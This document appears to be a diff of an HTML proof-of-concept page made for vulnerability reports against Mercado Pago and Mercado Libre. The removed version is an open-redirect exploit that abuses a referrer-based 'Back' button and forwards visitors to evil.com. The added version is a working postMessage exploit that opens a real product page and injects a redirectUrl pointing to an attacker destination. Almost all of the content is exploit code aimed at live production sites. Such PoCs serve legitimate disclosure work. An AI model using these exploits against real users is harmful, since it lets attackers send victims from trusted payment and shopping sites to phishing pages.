@@ -1,75 +1,122 @@
 <!doctype html>
 <html lang="en">
-<head>
-<meta charset="utf-8">
-<!-- sends the FULL referrer cross-origin so MP receives this URL -->
-<meta name="referrer" content="unsafe-url">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PoC - Mercado Pago open redirect (CWE-601)</title>
-<style>
-  body{font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;max-width:640px;margin:0 auto;padding:24px;line-height:1.5;color:#111}
-  h1{font-size:20px} code{background:#f2f2f2;padding:2px 6px;border-radius:4px;word-break:break-all;font-size:13px}
-  .ok{background:#e7f7ec;border:1px solid #2eaa5a;padding:16px;border-radius:8px}
-  .go{display:inline-block;background:#009ee3;color:#fff;text-decoration:none;padding:14px 20px;border-radius:8px;font-weight:600;margin-top:12px}
-  ol{padding-left:20px} small{color:#666}
-</style>
-</head>
-<body>
-<div id="app"></div>
-<script>
-(function(){
-  // ==== CONFIG: attacker's final destination (editable). Also via URL: ...poc.html#evil=https://other.com ====
-  var EVIL = "https://evil.com";
-  var mHash = (location.hash.match(/evil=([^&]+)/)||[])[1];
-  if (mHash) { try { EVIL = decodeURIComponent(mHash); } catch(e){} }
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CORE-021 PoC</title>
+    <style>
+      :root { color-scheme: dark; }
+      body { max-width: 860px; margin: 2rem auto; padding: 0 1rem; background: #0d0f12; color: #e7e9ed; font: 17px/1.5 system-ui, sans-serif; }
+      label { display: block; margin-top: 1rem; font-weight: 700; }
+      input { width: 100%; box-sizing: border-box; padding: .7rem; border: 1px solid #343942; border-radius: 5px; background: #15181d; color: #e7e9ed; font: inherit; }
+      button { margin: 1rem .5rem 0 0; padding: .8rem 1rem; border: 1px solid #3b414b; border-radius: 5px; background: #1b1f25; color: #e7e9ed; font: inherit; cursor: pointer; }
+      button:hover:not(:disabled) { background: #252a32; }
+      button:disabled { cursor: not-allowed; opacity: .45; }
+      code, pre { background: #15181d; }
+      code { padding: .15rem .3rem; }
+      pre { padding: 1rem; border: 1px solid #2b3038; border-radius: 5px; white-space: pre-wrap; min-height: 9rem; }
+      .warning { padding: .8rem; border-left: 3px solid #c9a227; background: #181713; color: #d7d1b8; }
+      .result { padding: .8rem; border-left: 3px solid #4f9d69; background: #121914; color: #c8dfcf; }
+    </style>
+  </head>
+  <body>
+    <h1>CORE-021 — Wishlist cross-origin postMessage redirect</h1>
 
-  var TARGET = "https://www.mercadopago.com.ar/banking/balance";
-  var app = document.getElementById("app");
-  function esc(s){return String(s).replace(/[&<>"']/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];});}
+    <p class="warning">Use a mobile User-Agent before opening the PoC or the product page. Allow popups for this site and sign in with your own Mercado Libre test account. Do not select or modify any Wishlist.</p>
 
-  // Bulletproof return detection: a query-param that rides INSIDE the referrer.
-  // On "go" we put ?frompoc=1 in OUR url -> that is the referrer MP sees ->
-  // the "Back" button runs location.assign(referrer) -> we come back to this page WITH ?frompoc=1.
-  // Fallbacks: sessionStorage + MP's document.referrer. Re-evaluated on pageshow (bfcache).
-  function render(){
-    var ref = document.referrer || "";
-    var returned = /[?&]frompoc=1/.test(location.search)
-                || sessionStorage.getItem('poc_sent') === '1'
-                || /mercadopago\.com/i.test(ref);
-    if (returned) {
-      sessionStorage.removeItem('poc_sent');
-      app.innerHTML =
-        '<div class="ok"><h1>&#10003; Open redirect CONFIRMED</h1>'+
-        '<p>You landed on this attacker-controlled origin from a legitimate Mercado Pago page'+
-        (ref ? ':</p><code>'+esc(ref)+'</code>' : ' (the "Back" button).</p>')+
-        '<p style="margin-top:12px">Forwarding to the attacker landing &rarr; <code>'+esc(EVIL)+'</code> &hellip;</p></div>';
-      setTimeout(function(){ location.replace(EVIL); }, 1000);  // -> victim ends up on evil.com
-    } else {
-      app.innerHTML =
-        '<h1>PoC &mdash; Open redirect in Mercado Pago (CWE-601)</h1>'+
-        '<p>Open this in a <b>mobile</b> browser (or with mobile emulation in DevTools), '+
-        '<b>logged in to Mercado Pago</b>.</p>'+
-        '<ol>'+
-        '<li>Tap the blue button below.</li>'+
-        '<li>On the MP balance page, tap <b>&#8592; Back</b> (top-left of the navbar).</li>'+
-        '<li>MP sends you back to this attacker origin, and from here you jump straight to <code>'+esc(EVIL)+'</code>.</li>'+
-        '</ol>'+
-        '<a class="go" href="'+TARGET+'">&#9654; Go to my Mercado Pago balance</a>'+
-        '<p><small>The bug: the "Back" button of MP&#39;s mobile navbar runs '+
-        '<code>location.assign(document.referrer)</code> with no host validation. '+
-        'This page controls the Referer, MP redirects here, and from here to the attacker destination.</small></p>';
-      var g = document.querySelector('a.go');
-      if (g) g.addEventListener('click', function(){
-        try { history.replaceState(null, '', location.pathname + '?frompoc=1'); } catch(e){}
-        try { sessionStorage.setItem('poc_sent','1'); } catch(e){}
+    <label for="target">Vulnerable product page</label>
+    <input id="target" value="https://www.mercadolibre.com.ar/el-portugues-nueces-mariposas-extra-light-x-1kg/p/MLA25811881/">
+
+    <label for="destination">External destination</label>
+    <input id="destination" value="http://evil.com/">
+
+    <button id="open">1. Open Mercado Libre</button>
+    <button id="open-wishlist" disabled>2. Send OPEN_LISTS_MODAL</button>
+    <button id="inject" disabled>3. Inject redirectUrl</button>
+    <button id="focus" disabled>4. Focus victim window</button>
+
+    <p class="result">After step 3, close the Wishlist bottom sheet with its normal X button. The same window should navigate to the external destination.</p>
+
+    <pre id="log">Waiting for step 1.</pre>
+
+    <script>
+      let victim = null;
+      const log = document.querySelector('#log');
+      const openWishlist = document.querySelector('#open-wishlist');
+      const inject = document.querySelector('#inject');
+      const focus = document.querySelector('#focus');
+
+      function victimAvailable() {
+        return victim && !victim.closed;
+      }
+
+      document.querySelector('#open').addEventListener('click', () => {
+        const target = document.querySelector('#target').value.trim();
+        victim = window.open(target, 'core021-victim');
+
+        if (!victim) {
+          log.textContent = 'The browser blocked the popup. Allow popups for this site and repeat step 1.';
+          return;
+        }
+
+        openWishlist.disabled = false;
+        inject.disabled = true;
+        focus.disabled = false;
+        log.textContent = [
+          'The attacker page opened the genuine VPP and retained its WindowProxy.',
+          'Wait until the product has completely loaded.',
+          'Return to this page without closing the VPP, then click step 2.'
+        ].join('\n');
       });
-    }
-  }
-  render();
-  // bfcache: on return from MP, Chrome may restore the page without re-running the script;
-  // pageshow re-evaluates the state so the redirect still fires.
-  window.addEventListener('pageshow', function(e){ if (e.persisted) render(); });
-})();
-</script>
-</body>
+
+      openWishlist.addEventListener('click', () => {
+        if (!victimAvailable()) {
+          log.textContent = 'The victim window is unavailable. Repeat step 1.';
+          return;
+        }
+
+        victim.postMessage('OPEN_LISTS_MODAL', '*');
+        inject.disabled = false;
+        victim.focus();
+        log.textContent = [
+          'First message sent from the attacker origin:',
+          "victim.postMessage('OPEN_LISTS_MODAL', '*');",
+          '',
+          'Confirm that the genuine Wishlist selector appeared.',
+          'Do not select a list. Return here for step 3.'
+        ].join('\n');
+      });
+
+      inject.addEventListener('click', () => {
+        const redirectUrl = document.querySelector('#destination').value.trim();
+
+        if (!victimAvailable()) {
+          log.textContent = 'The victim window is unavailable. Repeat step 1.';
+          return;
+        }
+
+        const message = {
+          method: 'giftRegistry:celebration-date:set-current-step',
+          args: {
+            stepName: 'celebrationDate',
+            redirectUrl
+          }
+        };
+
+        victim.postMessage(message, '*');
+        victim.focus();
+        log.textContent = [
+          'Second message sent from the attacker origin:',
+          JSON.stringify(message, null, 2),
+          '',
+          'Close the Wishlist bottom sheet with its normal X button.',
+          'The same window should navigate to: ' + redirectUrl
+        ].join('\n');
+      });
+
+      focus.addEventListener('click', () => {
+        if (victimAvailable()) victim.focus();
+      });
+    </script>
+  </body>
 </html>
